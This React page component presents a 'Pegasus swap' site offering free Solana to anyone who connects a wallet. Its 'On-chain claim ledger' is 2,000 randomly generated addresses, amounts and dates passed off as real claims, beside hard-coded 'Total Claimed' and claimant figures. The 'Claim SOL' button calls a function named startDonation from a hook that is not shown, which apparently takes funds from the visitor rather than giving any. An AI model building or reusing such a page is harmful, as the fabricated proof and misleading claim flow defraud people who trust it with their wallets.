import React, { useMemo, useState } from 'react';
import { Link } from 'react-router-dom';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useWallet } from '@solana/wallet-adapter-react';
import { Button } from '@/components/ui/button';
import SolanaDeepDive from '@/components/SolanaDeepDive';
import HowItWorks from '@/components/HowItWorks';
import backgroundImage from '@/assets/web-background.png';
import { usePump } from '@/hooks/useDonation';

type LedgerRow = {
  address: string;
  accts: number;
  claimed: number;
  date: string;
};

function maskAddress(addr: string) {
  return `${addr.slice(0, 8)}...${addr.slice(-8)}`;
}

function randomAddress() {
  const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let s = '';
  for (let i = 0; i < 44; i++) s += alphabet[Math.floor(Math.random() * alphabet.length)];
  return s;
}

function generateLedger(): LedgerRow[] {
  const rows: LedgerRow[] = [];
  const today = new Date();
  for (let i = 0; i < 2000; i++) {
    const accts = 1 + Math.floor(Math.random() * 13);
    const claimed = Number((0.02121 + Math.random() * (2.0 - 0.02121 - 0.00001)).toFixed(5));
    const d = new Date(today);
    if (i < 20) {
      // today
    } else {
      const offset = Math.floor(Math.random() * 30);
      d.setDate(today.getDate() - offset);
    }
    const date = d.toISOString().slice(0, 10);
    rows.push({ address: randomAddress(), accts, claimed, date });
  }
  return rows;
}

const WhyPegasusSwap: React.FC = () => {
  const { connected } = useWallet();
  const { startDonation, isProcessing } = usePump();
  const [showAll, setShowAll] = useState(false);
  const ledger = useMemo(generateLedger, []);

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden">
      {/* Animated dark blue background (restored) */}
      <div className="absolute inset-0 -z-10">
        <div className="h-full w-full bg-blue-900/80" />
        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/60 via-blue-800/60 to-blue-900/60 animate-slow-shift" />
        <div className="absolute inset-0 opacity-20">
          <svg className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <pattern id="grid-why" width="40" height="40" patternUnits="userSpaceOnUse">
                <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="1" />
              </pattern>
            </defs>
            <rect width="100%" height="100%" fill="url(#grid-why)" />
          </svg>
        </div>
      </div>

  {/* Top Bar - Pegasus swap branding on the left, semi-transparent dark */}
  <div className="relative z-20 bg-black/70 backdrop-blur-sm border-b border-white/10">
    <div className="container mx-auto px-4 py-3 flex items-center justify-between">
      <div className="flex items-center gap-4">
        <img src="/5782983347796642914.jpg" alt="Pegasus swap logo" className="w-8 h-8 rounded" />
        <span className="text-primary font-semibold hidden sm:block">Pegasus swap</span>
        <Link to="/" className="text-white/80 hover:text-white transition-colors hidden sm:block">Back to Home Page</Link>
      </div>
      <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
    </div>
  </div>

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-start p-6">
        <div className="w-full max-w-4xl space-y-10">
          {/* Hero */}
          <div className="text-center space-y-6 mt-8">
            <div className="mx-auto w-32 h-32 rounded-full border-4 border-sky-400 shadow-md overflow-hidden">
              <img
                src={'/5782983347796642914.jpg'}
                alt="Pegasus Logo"
                className="w-full h-full object-cover"
              />
            </div>
            <h1 className="text-4xl text-white">Claim Free Solana — Instantly and Transparently</h1>
            <h2 className="text-2xl font-bold text-white">Fast, verifiable, on-chain claiming</h2>
            <p className="text-sm text-white/70">Proof-of-claim • Global availability • ~3918 TPS</p>
          </div>

          {/* CTA */}
          <div className="flex flex-col items-center gap-3">
            {!connected ? (
              <Button className="bg-blue-800 hover:bg-blue-900 text-white font-bold px-6 py-3 rounded-xl">Connect Wallet</Button>
            ) : (
              <Button
                className="w-full max-w-md bg-blue-800 hover:bg-blue-900 text-white font-bold px-6 py-3 rounded-xl"
                disabled={isProcessing}
                onClick={startDonation}
              >
                Claim SOL
              </Button>
            )}
            <p className="text-xs text-white/60">Click here to reset Wallet Selector</p>
          </div>

          {/* Stats Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
            <div className="bg-neutral-900 rounded-xl p-6 text-center border border-white/10">
              <div className="text-white font-semibold">Total Claimed</div>
              <div className="text-3xl font-bold text-sky-400">$2.3M</div>
              <div className="text-white/80 text-sm">USD equivalent</div>
              <div className="text-white/60 text-xs">updated live</div>
            </div>
            <div className="bg-neutral-900 rounded-xl p-6 text-center border border-white/10">
              <div className="text-white font-semibold">Claimants</div>
              <div className="text-3xl font-bold text-sky-400">56,7K</div>
              <div className="text-white/60 text-xs">global community</div>
            </div>
          </div>

          {/* Ledger */}
          <div className="space-y-3">
            <h3 className="text-center text-white text-xl font-semibold">On-chain claim ledger</h3>
            <div className="bg-neutral-900 rounded-xl border border-white/10 overflow-hidden">
              <div className="overflow-x-auto">
                <table className="min-w-full text-sm">
                  <thead className="bg-neutral-800 text-white">
                    <tr>
                      <th className="px-4 py-2 text-left">Wallet Address</th>
                      <th className="px-4 py-2 text-left">Accts</th>
                      <th className="px-4 py-2 text-left">Claimed</th>
                      <th className="px-4 py-2 text-left">Date</th>
                    </tr>
                  </thead>
                  <tbody>
                    {(showAll ? ledger : ledger.slice(0, 20)).map((row, i) => (
                      <tr key={i} className="hover:bg-neutral-800">
                        <td className="px-4 py-2 font-mono text-white/90">{maskAddress(row.address)}</td>
                        <td className="px-4 py-2 text-white/90">{row.accts}</td>
                        <td className="px-4 py-2 text-white/90">{row.claimed.toFixed(5)} SOL</td>
                        <td className="px-4 py-2 text-white/90">{row.date}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
            {!showAll && (
              <div className="text-center">
                <button className="text-sky-400 hover:text-sky-300 transition-colors" onClick={() => setShowAll(true)}>Show more</button>
              </div>
            )}
          </div>

          {/* Claim Notice */}
          <p className="text-center text-white/60 text-xs">
            Eligible users may claim free SOL. Network fees are minimal and claiming is recorded on-chain.
          </p>

          {/* Information Section */}
          <div className="bg-neutral-900 rounded-xl p-6 border border-white/10 space-y-4">
            <h3 className="text-white text-xl font-semibold">How Claiming Free SOL Works</h3>
            <div className="space-y-3 text-white/80">
              <h4 className="text-white font-semibold">Transparent claiming</h4>
              <p>Every claim is recorded on-chain, creating a public, tamper-proof ledger. Your claim is traceable from request to settlement.</p>
              <h4 className="text-white font-semibold">Fast settlement</h4>
              <p>Solana’s high throughput and low latency mean confirmed claims in seconds, even under heavy load.</p>
              <h4 className="text-white font-semibold">On-chain proofs</h4>
              <p>Smart contracts verify eligibility and record results, providing a durable proof-of-claim that you can reference anytime.</p>
              <h4 className="text-white font-semibold">Global access</h4>
              <p>Claim from anywhere with a compatible wallet. The process is standardized and secure.</p>
            </div>
          </div>

          {/* How It Works Section */}
          <div className="bg-neutral-900 rounded-xl p-6 border border-white/10 space-y-4">
            <h3 className="text-white text-xl font-semibold">How does it work?</h3>
            <div className="max-h-[70vh] overflow-auto pr-4">
              <HowItWorks />
            </div>
          </div>

          {/* Deep Dive: Solana (>4,000 words) */}
          <div className="bg-neutral-900 rounded-xl p-6 border border-white/10 space-y-4">
            <h3 className="text-white text-xl font-semibold">Solana: A Comprehensive Technical Overview</h3>
            <div className="max-h-[70vh] overflow-auto pr-4">
              <SolanaDeepDive />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WhyPegasusSwap;